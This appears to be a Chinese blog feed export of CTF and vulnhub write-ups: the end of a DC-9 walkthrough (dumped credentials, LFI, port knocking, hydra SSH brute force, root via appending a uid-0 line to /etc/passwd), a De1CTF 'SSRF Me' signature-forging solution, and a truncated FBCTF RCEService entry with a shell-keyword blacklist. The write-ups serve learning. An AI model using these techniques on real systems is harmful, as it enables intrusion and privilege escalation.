<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----+-----------+---------------+</span><br><span class="line">| id | username  | password      |</span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| 1  | marym     | 3kfs86sfd     |</span><br><span class="line">| 2  | julied    | 468sfdfsd2    |</span><br><span class="line">| 3  | fredf     | 4sfd87sfd1    |</span><br><span class="line">| 4  | barneyr   | RocksOff      |</span><br><span class="line">| 5  | tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| 6  | jerrym    | B8m#48sd      |</span><br><span class="line">| 7  | wilmaf    | Pebbles       |</span><br><span class="line">| 8  | bettyr    | BamBam01      |</span><br><span class="line">| 9  | chandlerb | UrAG0D!       |</span><br><span class="line">| 10 | joeyt     | Passw0rd      |</span><br><span class="line">| 11 | rachelg   | yN72#dsd      |</span><br><span class="line">| 12 | rossg     | ILoveRachel   |</span><br><span class="line">| 13 | monicag   | 3248dsds7s    |</span><br><span class="line">| 14 | phoebeb   | smellycats    |</span><br><span class="line">| 15 | scoots    | YR3BVxxxw87   |</span><br><span class="line">| 16 | janitor   | Ilovepeepee   |</span><br><span class="line">| 17 | janitor2  | Hawaii-Five-0 |</span><br><span class="line">+----+-----------+---------------+</span><br></pre></td></tr></table></figure>
<p>尝试之后发现，只有admin能够登录后台</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191558.png" /></p>
<p>登录后台之后，再次点击 Manage，出现了奇怪的字符，猜测可能存在LFI。虽然不知道参数名，但是一般都是file，filename，path之类的，先尝试一下，实在不行在爆破</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191632.png" /></p>
<p>确实存在LFI。但是LFI并不能帮助我们get shell，除非说有日志，但是并不知道drupal的日志在哪。网页也没有命令执行的地方，因此，只能从22端口想办法。</p>
<h1 id="get-shell">3. get shell</h1>
<p>经过搜索如何绕过 "ssh filtered"，发现了这是一个端口保护的机制，叫做 Port Knocking。</p>
<p>简单来说就是默认把ssh上锁，不允许远程连接。并且设置一个端口序列，只有按照该序列访问对应的端口，才能够使 ssh 变成 open。这样子，才能够远程连接。而默认的序列文件的路径为：/etc/knockd.conf。</p>
<p>利用LFI读取其中的内容：（只记录了序列） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /etc/knockd.conf</span><br><span class="line">sequence: 7469, 8475, 9842</span><br></pre></td></tr></table></figure></p>
<p>然后依次执行下列命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 7469</span><br><span class="line">2. nmap -p 8475</span><br><span class="line">3. nmap -p 9842</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192323.png" /></p>
<p>然后再次查看22端口的情况，发现变成了open <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p 22 10.0.2.45</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192402.png" /></p>
<p>接着利用 hydra 爆破上面所搜集的所有用户名和密码，得到下面三个可以使用的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ssh 爆破</span><br><span class="line">login: chandlerb   password: UrAG0D!</span><br><span class="line">login: joeyt   password: Passw0rd</span><br><span class="line">login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>
<h1 id="权限提升">4. 权限提升</h1>
<p>随便一个之后进行信息收集，发现既没有suid，也没有sudo，也没有内核，也没有可疑进程，直到看到 janitor 的家目录下的某个文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /home/janitor/passwords-found-on-post-it-notes.txt</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure></p>
<p>将这些密码添加到刚刚爆破的密码字典中，再次进行爆破，得到一个新的结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure></p>
<p>登录该用户，发现终于有 sudo -l 了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192709.png" /></p>
<p>查看该文件的权限以及内容 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls -l /opt/devstuff/dist/test/test</span><br><span class="line">2. strings /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure></p>
<p>基本看不懂。直接执行得到帮助信息 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/test$ ./test</span><br><span class="line">Usage: python test.py read append</span><br></pre></td></tr></table></figure></p>
<p>但是还是看不懂，并且这个 test.py 就很可疑，猜测这就是编译之前的文件。因此顺着目录往回找，终于在 /opt/devstuff 目录下找到了 test.py 文件，其内容为： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure></p>
<p><strong>说白了就是指定两个文件，会将第一个文件的内容追加到第二个文件中</strong>。</p>
<p>因此，思路就很清晰了，我们可以在 /etc/passwd 中追加一个 “root” 用户就好了。</p>
<p>首先，执行下述命令，创建一个文件，并且写入需要加入到 /etc/passwd 中的内容。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;hdf:E1s2b9dIx7vPM:0:0:root:/root:/bin/bash&quot; &gt; s.txt</span><br></pre></td></tr></table></figure></p>
<p>（注意，这里的密码可以用 <code>openssl passwd [内容]</code> 生成，如果追加的内容没有密码，则无法登录！）</p>
<p>然后执行下面命令，将内容写入 /etc/passwd <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test s.txt /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>接着，查看 /etc/passwd 的内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514193450.png" /></p>
<p>（红框中的都是我测试的，只有最后一个可以）</p>
<p>最后，切换到 hdf 用户</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514193554.png" /></p>
<p>收尾工作就是读取flag了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@dc-9:~# cat theflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge in the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks for all the fish.</span><br></pre></td></tr></table></figure>
<h1 id="总结">5. 总结</h1>
<p>该靶机对于我来说比较简单，还让我学到了一个新的知识。涉及的攻击方法有：</p>
<ol type="1">
<li>SQL注入</li>
<li>文件包含</li>
<li>Port Knocking</li>
<li>密码爆破</li>
<li>sudo提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>sudo提权</tag>
        <tag>文件包含</tag>
        <tag>密码爆破</tag>
        <tag>Prot Knocking</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，看到一串代码，将代码整理一下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):    <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>进入环境之前还有一个小提示。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<p>先从路由看起： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure></p>
<p>当访问<code>ip/geneSign</code>时，param以GET方式传入，然后将<code>action=scan</code>，最后调用<code>getSign(action, param)</code>。而该函数返回一个md5加密得字符串。</p>
<p>再查看下一个路由： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure></p>
<p>当访问<code>ip/De1ta</code>时，GET传入param，cookie传入action和sign，然后执行<code>waf(param)</code>，该函数判断param参数（经过处理后）是否以<code>gopher</code>和<code>file</code>开头，也就是不能使用这两个协议进行文件读取。</p>
<p>如果<code>waf(param)</code>函数返回<code>False</code>，则创建一个<code>Task</code>对象，然后执行<code>task.Exec()</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
<p>会首先检查<code>self.checkSign()</code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
<p>只有满足<code>getSign(self.action, self.param) == self.sign</code>才可以继续执行，这里是一个要解决的点。</p>
<p>假设我们满足上述情况了，接下来先判断<code>if "scan" in self.action</code>，如果满足，则会执行<code>resp = scan(self.param)</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>该函数会去访问<code>param</code>并且读取其中得内容并返回。<strong>猜想：利用这个读取flag.txt中得内容</strong>。如果<code>param</code>的确有内容，那么返回到<code>Exec()</code>，然后执行<code>tmpfile.write(resp)</code>，也就是将读取得内容写到<code>./%s/result.txt</code>。</p>
<p>如果满足<code>if "read" in self.action</code>，则会读取<code>./%s/result.txt</code>中的内容，然后通过<code>result</code>返回。</p>
<p>最后执行<code>return json.dumps(task.Exec())</code>，将<code>Exec()</code>中的内容以json格式打印出来。</p>
<p>思路：通过对代码的分析，有了初步思路：</p>
<ol type="1">
<li>先将flag.txt中的内容写到<code>./%s/result.txt</code>中，也就是action中得有字符串scan；</li>
<li>然后读取<code>./%s/result.txt</code>中的内容，成功读取到flag，也就是action中也要有字符串read；</li>
</ol>
<p>难题：</p>
<ul>
<li>如何满足<code>self.checkSign()</code>，也就是<code>getSign(self.action, self.param) == self.sign</code></li>
</ul>
<p>可以利用<code>/geneSign?param=flag.txt</code>，但是这样子得到的是<code>getSign(scan, flag.txt)</code>的值，我们不仅需要<code>scan</code>还需要<code>read</code>。</p>
<p>注意 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
<p>分析： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param=flag.txtread, action=scan</span><br><span class="line">secert_key + param + action = secert_key + flag.txtreadscan</span><br></pre></td></tr></table></figure></p>
<p>也就是我们先用<code>/geneSign?param=flag.txtread</code>得到<code>secert_key + flag.txtreadscan</code>的MD5值，将其作为<code>sign</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114816.png" /></p>
<p>然后我们访问<code>/De1ta?param=flag.txt</code>，然后cookie中<code>Cookie: sign=83f8669fd768b006207e62cf66f61904;action=readscan</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114844.png" /></p>
<p>成功读取flag！</p>
<p>这是因为此时的<code>sign</code>其实是<code>hashlib.md5(secert_key + flag.txtread + scan).hexdigest()</code>。而执行<code>self.checkSign()</code>时<code>getSign(self.action, self.param) -&gt; hashlib.md5(secert_key + flag.txt + readscan).hexdigest()</code>，自然就满足了<code>getSign(self.action, self.param) == self.sign</code>。并且action中<code>read</code>和<code>scan</code>都有，也就是先将flag.txt内容写入<code>./%s/result.txt</code>，然后在读取该文件中的内容，从而得到了flag。</p>
<h1 id="总结">总结</h1>
<p>本题对于SSRF的考察就在于<code>urllib.urlopen(param).read()[:50]</code>，利用这读取flag文件的内容。</p>
<p>本题主要考察的其实是代码审计的能力！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>python</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>FBCTF2019 RCEService</title>
    <url>/2022/05/06/FBCTF2019%20RCEService/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BFBCTF2019%5DRCEService">RCEService</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>本题不知道如何绕过，因此就去找源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<p>从源码中可以看到，该题过滤了许多关键词，并且本题还有两个坑。</p>
<p><strong>利用%0a换行绕过</strong>。这里遇到第一个坑，那就是需要两个换行符才能绕过，不知道为什么。</p>
<p>也就是构造`</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 我有一个数据库</title>
    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
